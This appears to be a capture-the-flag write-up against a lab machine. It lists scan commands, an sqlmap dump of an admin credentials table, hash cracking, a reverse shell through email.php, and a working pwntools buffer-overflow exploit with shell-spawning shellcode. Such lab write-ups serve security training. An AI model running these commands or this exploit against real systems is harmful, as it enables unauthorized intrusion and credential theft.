1) PortScan
```bash
rustscan -a 10.13.37.10 --ulimit 5000 -- -sV -sC -Pn
```
![[Pasted image 20230913115945.png]]
2) Digging the domain
```bash
dnsrecon -r 10.13.37.10/24 -n 10.13.37.10
```
![[Pasted image 20230913120254.png]]
3) Analyze the web traffic to find the hidden folder
![[Pasted image 20230913120456.png]]
4) Use sqlmap to retrieve the admin hash
```bash
sqlmap -u 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php' --batch --forms --level 3 --risk 3 -D jetadmin -T users --dump
```
![[Pasted image 20230913120601.png]]
5) Crack the hash on crack station and login
![[Pasted image 20230913120633.png]]
6) Analyze the email.php traffic and change the request to open a reverse shell
![[Pasted image 20230913121242.png]]
![[Pasted image 20230913121421.png]]
7) Get a reverse shell and look on /home/leak. Download it locally and exploit
```python3
#!/usr/bin/python3
from pwn import *

shell = remote('10.13.37.10', 4444)
shell.recvuntil(b"Oops, I'm leaking! ")

leaking = int(shell.recvuntil(b"\n"),16)

payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"*(72-len(payload))
payload += p64(leaking)

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
shell.interactive()
```
8) Expose the binary using socat and launch the exploit
```bash
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &amp
```
